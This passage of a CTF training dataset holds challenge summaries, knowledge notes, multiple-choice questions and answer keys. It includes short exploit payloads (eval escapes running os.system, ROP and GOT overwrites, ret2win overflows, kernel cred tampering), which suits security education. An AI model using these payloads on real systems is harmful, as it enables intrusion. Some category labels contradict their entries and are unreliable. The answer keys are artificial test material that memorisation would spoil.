            "In scenarios involving Python's `eval()` function, especially within a sandboxed environment that compiles and executes user-provided code, understanding how and when Python evaluates escape sequences can provide a method to circumvent restrictions. Escape sequences like `\\x22` are not evaluated until the `eval()` call, allowing for strategic placement in user input to manipulate the code execution flow for unintended outcomes, such as file reading or command execution."
        ],
        "question": [
            "In a Python sandboxed environment designed to only accept inputs enclosed in double quotes without any literal double quote character inside, which of the following payloads successfully exploits an escape sequence to break out of the input restrictions and reads the file `flag.txt`? - A. `\" +open('flag.txt').read()+ \"` - B. `\" \\x22+os.system('cat flag.txt')+\\x22 \"` - C. `\" \\x22+open('flag.txt').read()+\\x22 \"` - D. `\"\\x22;import os;os.system('cat flag.txt');\\x22\"`",
            "In the context of Python code execution involving the `eval()` function, why is the payload `\" \\x22+open('flag.txt').read()+\\x22 \"` particularly effective in a restricted environment where escape sequences are not evaluated until runtime? - A. Because `\\x22` represents the newline character, which allows breaking out of the string context. - B. Because `\\x22` is ignored by `eval()`, rendering the sandbox restrictions useless. - C. Because `\\x22` is the hexadecimal escape sequence for a double quote, which is evaluated at runtime, allowing the inclusion of Python commands. - D. Because it causes a buffer overflow in the `eval()` function, allowing arbitrary code execution."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "esprfs",
        "write_up": "dataset/raw/esprfs.md",
        "type": "This CTF challenge is a **pwn** (exploit) challenge. \n\nThe challenge involves finding and exploiting a double fetch vulnerability in a custom virtual file system that uses a naive Huffman encoding compression scheme. The vulnerability allows for a buffer overflow that can be used to manipulate memory and gain arbitrary read/write capabilities.\n\nThe intended exploit involves triggering the double fetch to overflow a compressed file's size, leveraging freelist randomization to predict the heap layout, and corrupting a file's metadata pointer to achieve arbitrary read/write capabilities. The final step involves leaking and manipulating the `cred` structure of the process to elevate privileges to `root`.\n\nAdditionally, there are mentioned unintended bugs that can be found as an exercise, adding complexity and depth to the challenge.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "Double-fetch vulnerabilities occur when a program fetches user-supplied data from user space into kernel space multiple times without validating if the data has changed between fetches. These vulnerabilities can be exploited by modifying the supplied data between the first and second fetches, leading to unpredictable behavior or security issues. To exploit such vulnerabilities in challenges focusing on file systems or similar, manipulate the data between fetches to influence program behavior. This can be particularly effective in systems where data structures (such as Huffman trees in compression algorithms) depend on the content of the supplied data. To trigger a specific behavior, consider modifying data in a way that the first fetch dictates one behavior (e.g., allocation size based on uncompressed data), and the second fetch, after alteration, leads to an overflow or unexpected behavior due to the re-evaluated size or structure (e.g., increase the length corresponding to a compressed file to read or write out of bounds).",
            "In kernel exploitation, especially with constraints such as SMEP (Supervisor Mode Execution Prevention) and SMAP (Supervisor Mode Access Prevention), leveraging control over metadata structures and pointer manipulation can lead to arbitrary read/write capabilities. This can be achieved by corrupting file system structures through exploitation techniques like the one described, where manipulating the length of data structures (e.g., through double-fetch vulnerabilities) allows for out-of-bound access. Then, by strategically freeing and creating files to manipulate the heap layout, attackers can overwrite pointers in metadata structures, gaining arbitrary read/write access. This method can be further leveraged to modify critical security structures, such as the `cred` structure in Linux, to escalate privileges. The key steps in such exploitation include creating a known state through heap manipulation (spraying and creating holes), exploiting a vulnerability to achieve unintended access or modification capabilities, and using these capabilities for privilege escalation or system compromise.\n\nExample Strategy for Heap Manipulation and Arbitrary R/W:\n\n- Spray the heap by creating a lot of files.\n- Free one out of every 10 files to introduce predictable holes in the heap.\n- Exploit a double-fetch vulnerability to overflow a size or length value.\n- Use controlled oversized reads or writes to identify and corrupt specific file metadata.\n- Manipulate the corrupted file to overwrite pointers in other object's metadata, aiming for unallocated space or specific targets for arbitrary read/write."
        ],
        "question": [
            "When exploiting a double-fetch vulnerability in a context involving a custom file system with compression, why is modifying data between the first and second fetch critical, and what could be a direct consequence if the data modified introduces new characters? - A. Modifying data to change compression behavior, possibly causing buffer overflow. - B. Modifying data to correct errors in the original data submission, improving system stability. - C. Modifying data to reduce the size of the Huffman tree, optimizing storage space. - D. Modifying data to increase the speed of the second fetch, enhancing performance.",
            "In a scenario involving SMEP and SMAP constraints, which strategy can effectively turn a double-fetch vulnerability leading to an arbitrary read/write condition into a privilege escalation exploit? - A. Overwriting the `uid` field in the file\u2019s metadata to escalate the file's permissions. - B. Manipulating the heap to overwrite a file's `cred` structure pointers to gain arbitrary read/write capabilities, followed by altering the `cred` structure fields to elevate privileges. - C. Directly modifying the kernel's code section to disable SMEP and SMAP protections. - D. Changing the file system's code at runtime to ignore SMEP and SMAP entirely."
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Eternal Game",
        "write_up": "dataset/raw/Eternal Game.md",
        "type": "crypto",
        "competition": [
            "TAMUctf/2020",
            "https://ctftime.org/event/1009/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve secret keys and hashing algorithms like SHA-512, a hash length extension attack can be applied if the hash is generated by preappending a secret key to known data and the hashing algorithm used is vulnerable (like SHA-512). This attack allows for the creation of a valid hash for extended data without knowing the secret key, by exploiting the way hash functions process input data. To perform this attack, one must have the hash of a known data concatenated with the secret (`SHA512(secret_key || known_data)`), the known data itself, and the hash function used. Brute force may be used to guess the secret key length if it's not known.",
            "In scenarios that involve handling user inputs and generating hashes from them, it's crucial to properly sanitize and validate all inputs, especially before they are passed to hash generation functions. In the provided challenge, the `extract_int` function failed to account for additional data appended to a legitimate number, allowing an attacker to append arbitrary data to the input. This flaw can be mitigated by strictly validating inputs to ensure they only contain expected data formats, using regular expressions or similar validation methods to prevent the injection of unauthorized data that could be used in attacks like hash length extension attacks."
        ],
        "question": [
            "In a cybersecurity challenge, an attacker is planning to perform a hash length extension attack to forge a proof with a high score without having access to the secret key. The game uses the SHA-512 hashing algorithm, and the hash is generated by appending a known data to a secret key (`SHA512(secret_key || known_data)`). Which of the following is required for the attacker to successfully execute this attack?  - A. Knowledge of the exact value of the secret key. - B. Physical access to the server where the game is hosted. - C. Knowledge of the hash of the known data appended with the secret, the known data itself, and the vulnerable hashing algorithm used. - D. Ability to decrypt the SHA-512 hash algorithm. ",
            "During the review of a game where users can multiply a number and then generate a hash as proof of their score, a vulnerability was identified in the user input handling function `extract_int`. This function attempts to extract an integer from a string but does not sanitize or validate the input thoroughly, allowing extra data to be appended to an input that should strictly be numeric. How can this vulnerability be mitigated to prevent exploitation from attacks such as hash length extension attacks?  - A. Increase the length of the secret key used in hash generation. - B. Store all user inputs in encrypted form before processing. - C. Implement strict input validation checks, ensuring that the input matches the expected numeric format exclusively. - D. Switch to a non-vulnerable hash function like SHA-3 for generating hashes. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Eternally Pwned_ Infiltration",
        "write_up": "dataset/raw/Eternally Pwned_ Infiltration.md",
        "type": "forensics",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When investigating potential data exfiltration or infiltration within a network, analyzing network traffic with tools such as Wireshark can reveal hidden or suspicious transmissions. Echo requests (ICMP packets) can be used by attackers to covertly send or receive data. Malicious payloads or sensitive information might be encoded in formats like Base64 within these packets.",
            "To uncover hidden messages or data within network traffic, look for patterns or anomalies such as encoded strings (e.g., Base64). Once located, these strings can be decoded to reveal potentially sensitive information, parts of a CTF flag, or other significant data. Using the search function in traffic analysis tools like Wireshark efficiently narrows down the potential points of interest amidst vast amounts of data."
        ],
        "question": [
            "When investigating a security breach, an analyst notices suspicious Echo requests within the network traffic captured in Wireshark. Which of the following best describes why Echo requests (ICMP packets) could be significant in this context? - A. They are commonly used for network diagnostics only and cannot carry custom data. - B. These packets are usually large in size, making them ideal for data exfiltration without detection. - C. Attackers can use Echo requests to covertly send or receive data, possibly encoding malicious payloads or sensitive information. - D. Echo requests are encrypted by default, offering a secure method for attackers to communicate.",
            "During a forensic investigation of a compromised system, the investigator finds encoded strings in the network traffic and suspects they might hold crucial information. Which technique should be applied to these strings to possibly reveal hidden data or sensitive information? - A. Enhance the strings using a string enhancement software to make them readable. - B. Transcribe the encoded strings into hexadecimal format for better insight. - C. Decode the strings using an appropriate decoding technique, such as Base64, to reveal any hidden messages. - D. Convert the strings into binary form to detect any patterns that might indicate malicious activity."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "euler-the-cat",
        "write_up": "dataset/raw/euler-the-cat.md",
        "type": "reverse",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 347,
        "max_score": 347,
        "difficulty": 1.0,
        "knowledge": [
            "In audio steganography challenges, inspecting the spectrogram of a provided audio file can reveal hidden messages or clues. Tools like Audacity can be used to visualize the audio file's spectrogram.",
            "If an audio file's content appears distorted or has unnatural transformations, consider using spectral editing tools to modify the spectrogram. This can involve vertically reflecting the spectrogram, deleting specific spectral regions, shifting frequencies using a Frequency Shifter, or reversing the audio to decode hidden messages. \n\n    Example steps for manipulation in Audacity:\n    - Use the \"Spectral Delete\" tool to remove unwanted spectral parts.\n    - Apply a \"Frequency Shifter\" plugin to move sections of the audio around based on identified patterns in the spectrogram.\n    - Reverse the audio segment to reveal the hidden message."
        ],
        "question": [
            "In a scenario where an audio steganography challenge presents an audio file with hidden messages, which software tool could be used to visualize the audio file's spectrogram, potentially revealing those hidden messages or clues?  - A. Adobe Photoshop - B. Microsoft Word - C. Audacity - D. Microsoft Excel ",
            "In a challenge where an audio file exhibits unnatural transformations, resulting in distorted audio content, which sequence of actions might be employed to decode hidden messages using spectral editing tools?  - A. Increase volume, apply high-pass filter, and compress the audio. - B. Use the \"Spectral Delete\" tool to remove unwanted spectral parts, apply a \"Frequency Shifter\" plugin to adjust audio frequencies based on the spectrogram, and reverse the audio segment. - C. Adjust brightness and contrast, crop the audio segment, and increase playback speed. - D. Convert the audio file to an image, apply a grayscale filter, and resize the image. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Evil_boost",
        "write_up": "dataset/raw/Evil_boost.md",
        "type": "reverse",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 740,
        "max_score": 952,
        "difficulty": 0.7773109243697479,
        "knowledge": [
            "In scenarios dealing with command-line argument parsing vulnerabilities, especially when linked with conditional checks based on the parsed arguments to reveal a secret or perform specific operations, examine the conditional logic and corresponding values carefully. Manipulating these argument values may lead to unexpected behaviors or exposures of sensitive information, such as bypassing checks for revealing hidden messages or flags. \n   - Example: Provide specific argument values that meet the conditional checks, i.e., `--cplusplus 999 --python 777 --javascript 233`.",
            "When dealing with challenges that include arithmetic expression parsing or calculation, especially when using libraries like Boost.Spirit for evaluating expressions from strings, investigating the input pattern and finding expressions that fit the required conditions (such as length or specific character presence) can lead to the solution. Additionally, understanding the result of the expression's evaluation in the context of the challenge's logic is crucial. This can lead to reverse-engineering the correct input or exploiting the input validation logic.\n   - Example: To find an input that results in a specific value, knowing the restrictions (e.g., length is 11, must contain 5 numbers and one lowercase letter 'e', only certain operations are allowed), you can craft an input like `5e0*(5-1/5)` that fits these conditions and evaluates to the target number."
        ],
        "question": [
            "In a cybersecurity challenge involving command-line argument parsing with the Boost library in C++, if the application performs certain actions based on specific argument values, which of the following command-line inputs correctly serves as an exploit to fulfill the conditions `cplusplus=999, python=777, and javascript=233`? - A. `--cplusplus 999 --python 888 --javascript 233` - B. `--cplusplus 99 --python 77 --javascript 23` - C. `--cplusplus 999 --python 777 --javascript 233` - D. `--python 999 --cplusplus 777 --javascript 233` ",
            "Given a scenario where you need to input a string that is both parsed as an arithmetic expression and meets specific conditions (length of 11 characters, contains 5 numbers and one lowercase 'e', only allows certain arithmetic operations) to achieve a target result of 24, which of the following inputs correctly fits all the given constraints? - A. `5*4*(5-1/5)` - B. `5e0*(5-1/5)` - C. `5+4+5-(1/5)` - D. `5e5-(4*3/1)` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "ex5",
        "write_up": "dataset/raw/ex5.md",
        "type": "reverse",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": -1,
        "max_score": 940,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a file of an unknown type and the `file` command does not recognize its format, investigating the file's magic bytes (the initial sequence of bytes that indicates the file type) can provide clues about the appropriate software or tool needed to interact with or analyze the file. This approach can lead to discovering that a specialized application is required to handle the file, as was the case with the EX5 file extension being associated with MetaTrader5, a platform for trading and technical analysis.",
            "If reverse engineering or analyzing a script reveals encoded or encrypted data, particularly where a portion of the output (e.g., a flag format) is already known, XOR cipher can be a viable method to decrypt the data. In scenarios where the encrypted data or flag is suspected to be XOR'd with a repeating pattern or a sequential numeric key, applying a XOR operation with the known pattern or generating a key sequence based on the pattern length can reveal the hidden content.\n   - Example of applying XOR operation with a sequential numeric key:\n     ```python\n     xor('EncryptedDataHere', range(0, LengthOfKey))\n     ```"
        ],
        "question": [
            "When encountering a file labeled as \"data\" by the `file` command without any further format recognition, what should be the next step in identifying the correct software or tool to interact with the file? - A. Delete the file as it's not identifiable by standard methods. - B. Investigate the file's magic bytes to search for clues about its format and associated software. - C. Attempt to open the file with generic text editors to analyze its content. - D. Rename the file extension to a common format like .txt or .bin and try opening it again.",
            "In the context of decrypting data that has been identified as encoded or encrypted with a XOR cipher, and where a repetitive or sequential key is suspected, what Python code snippet could be used to reveal the encrypted content? - A. `xor('EncryptedContent', 'KnownKey')` - B. `xor('EncryptedContent', 'SuspectedKeyPattern')` - C. `xor('EncryptedContentHere', range(0, 50))` for a sequence assumed to be the key. - D. `encrypt('EncryptedContentHere', 'SequentialKey')`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Excellent Vista!",
        "write_up": "dataset/raw/Excellent Vista!.md",
        "type": "The type of this CTF challenge is: **forensics**",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with an OSINT challenge involving an image, examining the Exif data can provide valuable clues including GPS coordinates, date/time the photo was taken, and camera details. This requires tools like `exiftool`. Command to use: `exiftool [image file]`.",
            "GPS coordinates found in the Exif data of images can be transformed into a human-readable format or directly used in map services like Google Maps to pinpoint the location where the image was taken. This process involves replacing \"deg\" with the degree symbol and conducting a simple search with the coordinates."
        ],
        "question": [
            "In the context of an OSINT challenge where you need to find out the location an image was taken from, which tool and command would correctly extract metadata, including GPS coordinates, from the image for analysis? - A. `gpsinfo [image file]` - B. `metadatareader [image file]` - C. `exiftool [image file]` - D. `imagemetadata [image file]`",
            "After extracting GPS coordinates in the format \"29 deg 30' 34.33\" S, 153 deg 21' 34.46\" E\" from an image's Exif data in an OSINT challenge, how should you format the coordinates for a search on Google Maps to locate the exact place the photo was taken? - A. Leave the coordinates as is and search directly. - B. Replace \"deg\" with the degree symbol (\u00ba) and search. - C. Convert the coordinates to decimal format and search. - D. Sum up the degree, minutes, and seconds as a single number and search."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Exploitation Class",
        "write_up": "dataset/raw/Exploitation Class.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 356,
        "max_score": 792,
        "difficulty": 0.4494949494949495,
        "knowledge": [
            "For challenges involving buffer overflows in C programs, where data is written out of bounds due to improper index validation, first identify the flawed boundary check and understand its implications (such as overwriting adjacent memory). Then leverage this vulnerability to manipulate stack data (like canaries) or function pointers for control flow hijacking. When exploiting buffer overflow, ensure to carefully calculate offsets and sizes to avoid null terminators which could prematurely end your payload. This technique is utilized to leak sensitive information and execute arbitrary code. For instance, manipulating a vulnerable `writeData` function with incorrect index limits to overwrite adjacent memory and execute a ROP chain. \n    - Example payload snippet: \n    ```python\n    write(21, \"B\" * 12) # Overflow buffer to reach adjacent memory\n    canary = u64(read(21)[0xc:0xc+8]) - ord('C') # Leak the canary\n    ```",
            "When exploiting vulnerabilities that allow writing arbitrary values to arbitrary locations (like overwriting GOT entries), use this to redirect execution flow to your advantage, such as modifying the GOT to point to a one_gadget or system function, bypassing the need for code execution directly. In scenarios where the program uses inputs to modify entries at arbitrary indices, careful planning can enable libc address leaking and GOT hijacking. Ensure to calculate the correct offsets relative to the GOT and program sections to successfully redirect execution.\n    - Example payload snippet: \n    ```python\n    libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]  # Leaking libc address\n    shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a)  # Overwrite GOT entry for \"exit\" with one_gadget\n    ```"
        ],
        "question": [
            "In a scenario involving a buffer overflow due to incorrect index validation in a C program, the function below has a vulnerability due to improper boundary checking. Analyzing the function, how can an attacker exploit this flaw to manipulate adjacent stack data or hijack program execution flow?  ```c unsigned __int64 __fastcall writeData(char *a1) { unsigned int v2; // [rsp+4h] [rbp-14h] unsigned __int64 v3; // [rsp+8h] [rbp-10h]  v3 = __readfsqword(0x28u); puts(\"Which entry to write?\"); v2 = 0; __isoc99_scanf(\"%u\", &v2);; if ( v2 <= 0xFC ) { puts(\"What to write?\"); read(0, &a1[12 * v2], 0xCuLL); } return __readfsqword(0x28u) ^ v3; } ``` - A. By using a correct index, reusing the function to write valid data. - B. Exploiting the index validation to write outside the intended buffer bounds, potentially overwriting function pointers. - C. Avoiding buffer overflow by strictly following the index boundary condition `v2 <= 0xFC`. - D. Using `__readfsqword` to directly manipulate stack canaries or hijack control flow. ",
            "In a given vulnerability that allows arbitrary write access, such as modifying GOT (Global Offset Table) entries, which strategy effectively redirects code execution flow to execute arbitrary code? Consider the context provided in the write-up's exploitation steps where GOT entries are overwritten to change program behavior.  ```python libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]  # Leaking libc address shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a)  # Overwrite GOT entry for \"exit\" with one_gadget ``` - A. Incrementing GOT entries by a fixed offset to bypass ASLR. - B. Writing null bytes to GOT entries to prevent function calls. - C. Modifying a GOT entry to point to a `system` function or a one_gadget for immediate privilege escalation. - D. Directly modifying the return address on the stack to redirect program execution. "
        ],
        "answer": [
            "B. Exploiting the index validation to write outside the intended buffer bounds, potentially overwriting function pointers.",
            "C. Modifying a GOT entry to point to a `system` function or a one_gadget for immediate privilege escalation."
        ]
    },
    {
        "name": "extended-fibonacci-sequence",
        "write_up": "dataset/raw/extended-fibonacci-sequence.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When solving challenges involving generating Fibonacci sequences or their variations, implementing recursive functions in Python might significantly reduce the complexity of the solution. However, when dealing with large Fibonacci numbers or sequences, this method becomes highly inefficient due to repeated calculations. To enhance performance, caching previously calculated Fibonacci numbers using Python's `functools.lru_cache` decorator can greatly reduce computation time by avoiding redundant calculations.\n   ```python3\n   import functools\n\n   @functools.lru_cache(None)  \n   def fib(n):  \n      if n <= 1:  \n          return n  \n      return fib(n - 1) + fib(n - 2)\n   ```",
            "In challenges where the task involves communicating with a server (e.g., via netcat) to send and receive data, it's common to parse the received data to extract specific information needed to progress in the challenge. Regular expressions (regex) can be used to search and extract numerical data or other patterns from strings. This approach is particularly useful for handling server responses that include a prompt or specific data format. Once the necessary data is extracted and processed, it can be sent back to the server using socket programming libraries such as `pwntools` for Python.\n   Example for extracting number from server response and sending a processed answer:\n   ```python3\n   import re\n   from pwn import *\n\n   io = process(['nc', 'example.com', 'port'])\n   data = io.recvuntil(\":\").decode()\n   n = int(re.search(\"(\\d{1,})\\n\", data).group(0))\n   # Process n to compute the response, then:\n   io.sendline(str(response))\n   ```"
        ],
        "question": [
            "When attempting to solve a computational problem that requires generating and manipulating a Fibonacci sequence with an enhanced efficiency in Python, which of the following methods is best suited to avoid redundant calculations and significantly reduce the computational time for large inputs? - A. Utilize a for loop to iterate through the Fibonacci sequence, recalculating each number. - B. Implement the sequence using a while loop without any form of memoization or caching. - C. Use the `functools.lru_cache` decorator to cache the results of the recursive function calls used in calculating the Fibonacci sequence. - D. Store each calculated Fibonacci number in a global list and manually check for its existence before recalculating.",
            "In a programming challenge that involves interacting with a remote server to send processed data back, assuming the data received includes specific numbers embedded within text, which of the following approaches would be most appropriate for extracting a needed numerical value from a server's response using Python? - A. Use string slicing assuming a fixed format of the server response every time. - B. Split the received string by spaces and assume the number is always at a predefined position. - C. Utilize Python's `re.match` to look for exact matches without considering the flexibility of regex patterns. - D. Apply regular expressions (`re.search`) to dynamically find and extract numerical values regardless of their position or formatting in the server's response."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "external",
        "write_up": "dataset/raw/external.md",
        "type": "This CTF challenge write-up is categorized as a **pwn** challenge.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 467,
        "max_score": 1000,
        "difficulty": 0.467,
        "knowledge": [
            "Buffer overflow vulnerabilities can be exploited to bypass protections and manipulate execution flow in binaries. When the binary reads user input into a buffer without limiting the number of bytes based on the buffer size, an attacker can overflow the buffer into adjacent memory. This can be combined with knowledge of the Global Offset Table (GOT) and Procedure Linkage Table (PLT) to redirect execution flow, even when direct calls to PLT functions are not possible due to modifications like clearing the GOT. The exploit process involves constructing a ROP chain to execute system calls directly, manipulate GOT entries, and leverage PLT addresses to restore functionality of the binary or call system functions.\n   - Example payload for redirecting execution flow and manipulating GOT entries via buffer overflow:\n     ```python\n     payload = b\"A\"*0x58 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(got_start) + p64(0) + p64(syscall_ret) + p64(elf.sym.main)\n     ```",
            "After achieving control of the execution flow through buffer overflow and GOT manipulation, it's possible to leak addresses from the GOT to determine the versions of dynamically linked libraries used by the binary (such as libc). With the addresses from the GOT, an attacker can calculate the base address of these libraries in memory. This allows for the execution of arbitrary code or system commands by leveraging \"one_gadget\" addresses or similar executable code snippets within these libraries. This technique is especially useful for bypassing non-executable stack protections and achieving remote code execution.\n   - Example payload for leaking libc addresses and executing a \"one_gadget\" to get a shell:\n     ```python\n     leak_payload = p64(pop_rdi) + p64(elf.sym.got[\"puts\"]) + p64(elf.sym.plt[\"puts\"]) + p64(elf.sym.main)\n     exec_payload = b\"C\"*0x58 + p64(libc.address + one_shot_offset) + b\"\\x00\"*0x100\n     ```"
        ],
        "question": [
            "In a binary vulnerability challenge, given the binary reads input into an 80-byte buffer and uses `read(0, buff, 0xf0)`, causing an overflow, which technique would be best to exploit this vulnerability and manipulate execution flow? - A. Use a format string attack to leak memory addresses. - B. Overwrite local variables on the stack to alter control flow. - C. Construct a Return-Oriented Programming (ROP) chain utilizing `syscall` to execute arbitrary code. - D. Utilize a heap overflow to overwrite the Global Offset Table (GOT). ",
            "After achieving control of execution flow via buffer overflow, which payload could an attacker use to leak addresses from the Global Offset Table (GOT) and determine library versions such as libc? - A. Send a payload that utilizes a `jmp` instruction to the GOT. - B. Craft a payload that writes arbitrary values to the GOT to observe changes in program behavior. - C. Use a payload that takes advantage of `pop` gadgets to manipulate registers and call `puts` with the address of a GOT entry. - D. Create a denial-of-service attack to crash the service and leak memory addresses in error logs. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "EXtravagant",
        "write_up": "dataset/raw/EXtravagant.md",
        "type": "This write-up is for a forensics challenge.",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 50,
        "max_score": 2199,
        "difficulty": 0.022737608003638016,
        "knowledge": [
            "When exploiting web applications developed with Flask (or similar web frameworks), if the application improperly handles user input in regular expressions (regex), you can inject regex patterns to either bypass security checks or manipulate the query to access restricted data. In this scenario, by injecting a specific regex pattern (`A.*`) into a parameter expected to be part of a regex search, you can manipulate the search logic to return unintended results, potentially exposing sensitive information or system data (like a flag). This is particularly useful when the application concatenates user input directly into a regex pattern without proper sanitization or validation.",
            "If a web application uses regex search with settings (like case sensitivity) influenced by user-controlled inputs, it's possible to alter the behavior of the regex search by manipulating those inputs. By injecting a value that internally enables options similar to `re.IGNORECASE`, an attacker can bypass case-sensitive security mechanisms or filters, broadening the scope of a regex injection attack to reveal information that would otherwise be protected by case-sensitive checks. This method evidences the need for careful validation and sanitization of all user inputs, especially when they influence the logic or configuration of security-sensitive operations like regex searches."
        ],
        "question": [
            "In a Flask web application, if the developer concatenates user inputs directly into the pattern of a regular expression (regex) search without sanitization, which of the following payloads could be used to exploit this vulnerability and manipulate the search logic? - A. `'; DROP TABLE users; --` - B. `A.*` - C. `admin' OR '1'='1` - D. `../../etc/passwd`",
            "Given a web application where regex search behavior can be influenced by user-controlled inputs, how might an attacker manipulate the search to ignore case sensitivity, potentially revealing sensitive information or bypassing case-sensitive filters? - A. By setting a high value for the maximum number of returned results to overflow the buffer. - B. Injecting a script tag `<script>alert(1);</script>` to perform XSS. - C. Manipulating the input value to enable regular expression flags, such as setting it to a value that internally maps to `re.IGNORECASE`. - D. Inserting SQL commands `SELECT * FROM users WHERE username = 'admin'` to perform SQL injection."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Ez PDF 100",
        "write_up": "dataset/raw/Ez PDF 100.md",
        "type": "pwn",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing PDF files for hidden information or flags, two common techniques include visually inspecting elements (such as images) using a PDF viewer and searching for encoded strings (e.g., base64) by opening the PDF with a text editor. For base64 encoded strings specifically, decoding them may reveal parts of or whole flags.\n   - Example of base64 encoded string to be decoded: `SW4gdGhpcyBxdWVzdGlvbiwgdGhlIGZsYWcgaGFzIGJlZW4gZGl2aWRlZCBpbnRvIDMgcGFydHMuIFlvdSBoYXZlIGZvdW5kIHRoZSBmaXJzdCBwYXJ0IG9mIHRoZSBmbGFnISEgVENQMVB7RDAxbjlfRjAyM241MUM1`",
            "For challenges involving nested zip files that require automated extraction, a Python script utilizing `os.system` with appropriate `find`, `unzip`, and `rm` commands can be employed to sequentially extract each file and potentially retrieve the password for the next layer from a text file until the final flag is reached.\n   - Example code snippet to automate the extraction:\n     ```python\n     import os\n\n     zip_number = 25000  # Total number of nested zip files.\n     cmd1 = \"find . -name '*.zip' -exec unzip -o -P \"  # Command to find and unzip files.\n     cmd2 = \" {} \\; -exec rm {} \\;\"  # Command to remove the zip file after extraction.\n\n     file = open(\"password.txt\", \"r\")  \n     pswd = (file.read()).strip()  # Read the initial password.\n     file.close()\n\n     for i in range(1, zip_number):  \n         os.system(cmd1 + pswd + cmd2)  # Execute the unzip and remove command with the current password.\n         \n         file = open(\"password.txt\", \"r\")  \n         pswd = (file.read()).strip()  # Update password for the next iteration.\n         file.close()\n     ```"
        ],
        "question": [
            "When attempting to find hidden flags within a PDF document, which method could be useful for extracting encoded information that is not immediately visible in a text editor? - A. Converting the PDF to an image and analyzing the pixels - B. Running the PDF through a spell checker - C. Decoding base64 encoded strings found within the document's text - D. Summarizing the PDF content using a natural language processing (NLP) algorithm ",
            "In a challenge involving the automated extraction of nested zip files with passwords, which Python library method is essential for executing system commands that unzip and delete files as part of the solution? - A. `zipfile.ZipFile.extractall()` - B. `subprocess.run()` - C. `os.system()` - D. `shutil.unpack_archive()` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Ez Ret 2 Win _",
        "write_up": "dataset/raw/Ez Ret 2 Win _.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with return-to-win (ret2win) challenges that work locally but not remotely, consider the possibility that the address to jump to needs a minor adjustment due to stack alignment differences between environments. This can often be fixed by adding or subtracting a small value (e.g., +1) to the function address in your payload. Example adjustment in payload: payload += p64(binary.sym.rasengan + 1)",
            "In buffer overflow vulnerabilities, specifically when the vulnerable function is `gets()`, payload construction should ensure that the number of bytes sent exactly matches the distance from the input buffer to the return address plus the size of the address being overwritten. This precision is crucial in successfully redirecting execution flow to the desired function without causing unexpected behavior. Example payload construction for a buffer size of 0xa8 bytes: payload  = 0xa8 * b'A' + p64(target_function_address)"
        ],
        "question": [
            "When executing a ret2win challenge remotely, if it fails but works locally, which technique could potentially resolve an issue related to stack alignment? - A. Add a NOP slide before the payload - B. Adjust the target function address by subtracting 2 - C. Add or subtract a small value (e.g., +1) to the target function address in the payload - D. Increase the buffer size by a significant amount to account for environmental differences",
            "In a scenario where a program crash is caused by a buffer overflow attack using the `gets()` function, if the buffer size is 0xa8 bytes from the return address, how should the payload be constructed to overwrite the return address with `target_function_address`? - A. payload = 0xa8 * b'B' + p32(target_function_address) - B. payload  = 0xa7 * b'A' + p64(target_function_address) - C. payload = \"A\" * 256 + p64(target_function_address) - D. payload  = 0xa8 * b'A' + p64(target_function_address)"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Ezchallz",
        "write_up": "dataset/raw/Ezchallz.md",
        "type": "crypto",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": 100,
        "max_score": 940,
        "difficulty": 0.10638297872340426,
        "knowledge": [
